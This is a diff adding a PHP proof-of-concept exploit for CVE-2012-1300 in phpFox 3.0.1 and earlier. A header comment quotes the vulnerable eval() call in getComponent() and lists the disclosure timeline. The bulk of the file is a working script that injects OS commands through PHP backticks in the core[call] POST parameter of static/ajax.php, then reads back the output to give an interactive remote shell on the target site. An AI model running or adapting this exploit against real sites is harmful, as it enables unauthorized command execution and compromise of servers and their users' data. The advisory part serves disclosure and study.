@@ -1,0 +1,97 @@
+<?php
+
+/*
+    -----------------------------------------------------------
+    phpFox <= 3.0.1 (ajax.php) Remote Command Execution Exploit
+    -----------------------------------------------------------
+    
+    author.............: Egidio Romano aka EgiX
+    mail...............: n0b0d13s[at]gmail[dot]com
+    software link......: http://www.phpfox.com/
+    
+    +-------------------------------------------------------------------------+
+    | This proof of concept code was written for educational purpose only.    |
+    | Use it at your own risk. Author will be not responsible for any damage. |
+    +-------------------------------------------------------------------------+
+    
+    [-] vulnerable code in Phpfox_Module::getComponent() method defined into /include/library/phpfox/module/module.class.php
+    
+	716.			$aParts = explode('.', $sClass);
+	717.			$sModule = $aParts[0];		
+	718.			$sComponent = $sType . PHPFOX_DS . substr_replace(str_replace('.', PHPFOX_DS, $sClass), '', 0, strlen($sModule . PHPFOX_DS));
+	...
+	748.			if (preg_match('/(.*?)\((.*?)\)/', $sComponent, $aMatches) && !empty($aMatches[2]))
+	749.			{
+	750.				eval('$aParams = array_merge($aParams, array(' . $aMatches[2] . '));');
+	751.	
+	752.				$sComponent = $aMatches[1];		
+	753.				$sClass = $aMatches[1];			
+	754.			}
+	
+	This method uses its $sClass parameter  to construct the $sComponent variable that might  be used to inject and execute	semi-arbitrary
+	PHP code in a eval() call at line 750.  Due to $sClass parameter is "explode()d" by dots at line 716 andto satisfy  the regex  at line
+	748,  isn't possible to inject code  which contains dots  or  parentheses,  but is still possible to inject semi-arbitrary OS commands
+	leveraging of PHP's backtick operator.  Input passed  through $_POST[core][call]  (or $_POST[phpfox][call] in v2)  to /static/ajax.php
+	is passed to getComponent()	method as $sClass parameter.
+	
+    [-] Disclosure timeline:
+	
+	[07/02/2012] - Vulnerability discovered
+	[09/02/2012] - Vendor notified through http://www.phpfox.com/contact/
+	[24/02/2012] - CVE number requested
+	[27/02/2012] - Assigned CVE-2012-1300
+	[27/02/2012] - Vendor update released: http://www.phpfox.com/blog/v2-1-0-build-3-v3-0-1-build-3-released/
+	[23/03/2012] - Public disclosure
+
+*/
+
+error_reporting(0);
+set_time_limit(0);
+ini_set("default_socket_timeout", 5);
+
+function http_send($host, $packet)
+{
+    if (!($sock = fsockopen($host, 80))) die("\n[-] No response from {$host}:80\n");
+    fputs($sock, $packet);
+    return stream_get_contents($sock);
+}
+
+print "\n+----------------------------------------------------------+";
+print "\n| phpFox <= 3.0.1 Remote Command Execution Exploit by EgiX |";
+print "\n+----------------------------------------------------------+\n";
+
+if ($argc < 3)
+{
+    print "\nUsage......: php $argv[0] <host> <path>\n";
+    print "\nExample....: php $argv[0] localhost /";
+    print "\nExample....: php $argv[0] localhost /phpfox/\n";
+    die();
+}
+
+list($host, $path) = array($argv[1], $argv[2]);
+
+$r_pack  = "GET {$path}static/tmp HTTP/1.0\r\n";
+$r_pack .= "Host: {$host}\r\n";
+$r_pack .= "Connection: close\r\n\r\n";
+
+$packet  = "POST {$path}static/ajax.php?do=/ad/complete/ HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Content-Length: %d\r\n";
+$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$packet .= "X_REQUESTED_WITH: XMLHttpRequest\r\n";
+$packet .= "Connection: close\r\n\r\n%s";
+
+while(1)
+{
+    print "\nphofox-shell# ";
+    if (($cmd = trim(fgets(STDIN))) == "exit") break;
+	else if (preg_match('/\./', $cmd)) print "\nDots not allowed!\n";
+	else if (preg_match('/\)/', $cmd)) print "\nParenthesis not allowed!\n";
+	else
+	{
+		$payload = "core[call]=.(`{$cmd}>tmp`).";
+		http_send($host, sprintf($packet, strlen($payload), $payload));
+		$output = http_send($host, $r_pack);
+		!preg_match('/404 not/i', $output) && preg_match('/\n\r\n(.*)/s', $output, $m) ? print $m[1] : die("\n[-] Exploit failed!\n");
+	}
+}
